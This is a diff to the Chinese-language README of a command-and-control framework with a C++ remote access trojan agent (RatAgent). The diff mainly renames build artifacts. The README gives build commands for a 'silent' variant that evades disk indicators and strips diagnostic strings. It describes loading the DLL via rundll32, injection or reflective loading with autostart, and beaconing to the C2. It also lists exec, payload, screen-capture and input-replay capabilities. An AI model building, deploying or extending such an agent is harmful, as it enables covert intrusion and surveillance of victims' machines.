@@ -33,8 +33,8 @@ c2/
 │   └── cmd/ratctl/            # 交互式 shell（会话/系统/截屏/远控/payload）
 ├── client/                    # C++ Agent（多模块解决方案：sys / screen / template）
 │   ├── agents.sln             # VS 打开这个：模块分组，core(共享)/docs 有独立文件夹
-│   ├── RatAgent.vcxproj       # sys 模块 → RatAgent.exe（控制台形态）
-│   ├── RatAgentDll.vcxproj    # sys 模块 → RatAgent.dll（rundll32 / 宿主 / 注入；静态 CRT）
+│   ├── RatAgent.sys.exe.vcxproj  # sys 模块 EXE 形态 → RatAgent.sys.exe（控制台）
+│   ├── RatAgent.sys.vcxproj      # sys 模块 DLL 形态 → RatAgent.sys.dll（rundll32/宿主/注入；静态 CRT）
 │   ├── caps_sys.cpp           # "sys"模块的能力清单（每个模块工程一份）
 │   ├── agents/_template/      # **模块工程模板**：复制它开新模块（见其 README）
 │   ├── agents/screen/         # "screen"（远程桌面）模块：抓屏/屏幕流/输入回放/桌面切换
@@ -70,12 +70,12 @@ MSBUILD = "C:/Program Files/Microsoft Visual Studio/18/Community/MSBuild/Current
 "%MSBUILD%" client/agents.sln -p:Configuration=Release -p:Platform=x64
 
 # 或单独编某个工程
-"%MSBUILD%" client/RatAgent.vcxproj    -p:Configuration=Debug -p:Platform=x64   # → RatAgent.exe
-"%MSBUILD%" client/RatAgentDll.vcxproj -p:Configuration=Debug -p:Platform=x64   # → RatAgent.dll
+"%MSBUILD%" client/RatAgent.sys.exe.vcxproj -p:Configuration=Debug -p:Platform=x64   # → RatAgent.sys.exe
+"%MSBUILD%" client/RatAgent.sys.vcxproj     -p:Configuration=Debug -p:Platform=x64   # → RatAgent.sys.dll
 ```
 
 > 通过解决方案构建时，6 个产物都落在 `client/x64/<Config>/`，**符号文件与产物同名**
-> （`RatAgent.dll` 配 `RatAgent.dll.pdb`、`RatAgent.screen.exe` 配 `RatAgent.screen.exe.pdb`），
+> （`RatAgent.sys.dll` 配 `RatAgent.sys.dll.pdb`、`RatAgent.screen.exe` 配 `RatAgent.screen.exe.pdb`），
 > 不会互相覆盖。每个工程有**自己的中间目录**（`<工程名>/x64/<Config>/`）：EXE 与 DLL 工程编译
 > 同一批 core 源码但宏不同（`_CONSOLE` vs `_USRDLL`），共用中间目录会导致 `.obj` 互相覆盖、
 > 静默产出错误二进制。
@@ -94,9 +94,9 @@ MSBUILD = "C:/Program Files/Microsoft Visual Studio/18/Community/MSBuild/Current
 
 ```
 :: 静默版：无任何输出、磁盘零写入
-"%MSBUILD%" client/RatAgentDll.vcxproj -p:Configuration=Release -p:Platform=x64 -p:RatAgentDebug=0 ...
+"%MSBUILD%" client/RatAgent.sys.vcxproj -p:Configuration=Release -p:Platform=x64 -p:RatAgentDebug=0 ...
 :: 静默但保留稳定身份（只落 agent.id，不打印、不落日志）
-"%MSBUILD%" client/RatAgentDll.vcxproj -p:Configuration=Release -p:Platform=x64 -p:RatAgentDebug=0 -p:RatAgentPersistId=1 ...
+"%MSBUILD%" client/RatAgent.sys.vcxproj -p:Configuration=Release -p:Platform=x64 -p:RatAgentDebug=0 -p:RatAgentPersistId=1 ...
 ```
 
 实测（Release）：DLL 从 374,784 B 降到 351,232 B，6 条典型诊断串由 6/6 命中变为 **0/6**；
@@ -106,7 +106,8 @@ MSBUILD = "C:/Program Files/Microsoft Visual Studio/18/Community/MSBuild/Current
 > （仍可按已知的 32 位 hex 触发命名事件）。跨进程停止用的命名事件 `Local\RatAgentStop.<id>`
 > 仍会创建 —— 它是内核对象，不是磁盘 IOC。
 
-产物：`client/x64/Debug/RatAgent.exe` 与 `client/x64/Debug/RatAgent.dll`。
+产物：`client/x64/<Config>/RatAgent.sys.exe` 与 `client/x64/<Config>/RatAgent.sys.dll`
+（`RatAgent.sys.*` = **sys 模块**的产物；每个模块的产物名都是 `RatAgent.<module>.<形态>`）。
 
 > 受限环境（无 GUI/沙箱会话）下，既有 VS 输出目录可能不可写，改用工作区内新目录：
 > `-p:IntDir=<repo>/build/agent/obj/ -p:OutDir=<repo>/build/agent/bin/`，
@@ -116,18 +117,20 @@ MSBUILD = "C:/Program Files/Microsoft Visual Studio/18/Community/MSBuild/Current
 
 | 形态 | 入口 | 适用场景 | 身份/日志位置 |
 |---|---|---|---|
-| `RatAgent.exe` | `main()`（控制台） | 独立进程部署、调试、`--selftest` | CWD 下 `<module>.id`；stdout |
-| `RatAgent.dll` | 导出 `Start`/`StartAgent` 等 | rundll32 宿主、被其他程序/注入器加载 | `%LOCALAPPDATA%\RatAgent\<module>.id` + `<module>.log`（可用 `id=`/`log=` 覆盖） |
+| `RatAgent.<module>.exe` | `main()`（控制台） | 独立进程部署、调试、`--selftest` | CWD 下 `<module>.id`；stdout |
+| `RatAgent.<module>.dll` | 导出 `Start`/`StartAgent` 等 | rundll32 宿主、被其他程序/注入器加载 | `%LOCALAPPDATA%\RatAgent\<module>.id` + `<module>.log`（可用 `id=`/`log=` 覆盖） |
+
+（例：sys 模块是 `RatAgent.sys.exe` / `RatAgent.sys.dll`，screen 模块是 `RatAgent.screen.exe` / `RatAgent.screen.dll`。）
 
 DLL 的三种用法（都支持 `-tcp` 切长连接；默认 beacon `127.0.0.1:8080`、轮询 5s）：
 
 ```
 :: 1) rundll32（Start 阻塞驻留，保证进程存活；Stop 可在另一个进程里触发跨进程停止事件）
-rundll32 RatAgent.dll,Start 127.0.0.1,8080,-s,5
-rundll32 RatAgent.dll,Stop  id=<module>.id 路径或 32 位 hex>
+rundll32 RatAgent.sys.dll,Start 127.0.0.1,8080,-s,5
+rundll32 RatAgent.sys.dll,Stop  id=<module>.id 路径或 32 位 hex>
 
 :: 2) 自己的加载器 / 宿主（同进程启停，可 FreeLibrary 卸载）
-LoadLibraryW(L"RatAgent.dll") → StartAgent("127.0.0.1,8080,-s,5") → … → StopAgent()
+LoadLibraryW(L"RatAgent.sys.dll") → StartAgent("127.0.0.1,8080,-s,5") → … → StopAgent()
 
 :: 3) 注入 / 反射加载（远程 LoadLibrary，或手动映射；这类场景没有参数通道）
 ::    本 DLL **加载即自启**：有 %LOCALAPPDATA%\RatAgent\<module>.autostart.args（或 %TEMP% 下
@@ -143,7 +146,7 @@ LoadLibraryW(L"RatAgent.dll") → StartAgent("127.0.0.1,8080,-s,5") → … → 
 
 | 模块 | 产物 | 能力（能力位） | 说明 |
 |---|---|---|---|
-| `sys` | `RatAgent.exe` / `RatAgent.dll` | `bit0` 系统类 | sysinfo / exec / payload（由 core 内置处理） |
+| `sys` | `RatAgent.sys.exe` / `RatAgent.sys.dll` | `bit0` 系统类 | sysinfo / exec / payload（由 core 内置处理） |
 | `screen` | `RatAgent.screen.exe` / `RatAgent.screen.dll` | `bit1` 远程桌面 | 抓屏 `0x1001` / 屏幕流 `0x1002` / 输入回放（数据走 4445 中继）；源码在 [client/agents/screen](client/agents/screen/) |
 | `template` | `RatAgent.template.exe` / `.dll` | `bit0` | 工程模板（自带 `0x2001` 示例指令），复制它开新模块 |
 
@@ -167,7 +170,7 @@ LoadLibraryW(L"RatAgent.dll") → StartAgent("127.0.0.1,8080,-s,5") → … → 
 
 ```
 :: 同一工程出不同模块（默认 sys；新模块工程应把这两个值写死成自己的）
-"%MSBUILD%" client/RatAgent.vcxproj -p:Configuration=Release -p:Platform=x64 ^
+"%MSBUILD%" client/RatAgent.sys.exe.vcxproj -p:Configuration=Release -p:Platform=x64 ^
     -p:RatAgentModuleId=probe "-p:RatAgentModuleCaps=(c2::kCapSys)" ...
 
 :: 屏幕模块（它有自己的工程）
@@ -228,9 +231,9 @@ cmake --build build/runpic --config Release    # 产物 build/runpic/bin/runpic.
 
 1. 启动 C2：`./bin/c2server.exe`（监听 4444 + 4445 + 8080，PSK 编译期内置）
 2. 启动 Agent（三选一）：
-   - beacon（默认）：`RatAgent.exe 127.0.0.1 8080 -s 5`
-   - TCP 长连接：`RatAgent.exe 127.0.0.1 4444 -tcp`
-   - DLL 形态：`rundll32 RatAgent.dll,Start 127.0.0.1,8080,-s,5`（详见上文"Agent 两种形态"）
+   - beacon（默认）：`RatAgent.sys.exe 127.0.0.1 8080 -s 5`
+   - TCP 长连接：`RatAgent.sys.exe 127.0.0.1 4444 -tcp`
+   - DLL 形态：`rundll32 RatAgent.sys.dll,Start 127.0.0.1,8080,-s,5`（详见上文"Agent 两种形态"）
    - `--selftest` 可单独跑加密自检后退出
 3. 控制端：`./bin/ratctl.exe`，交互式命令：
 
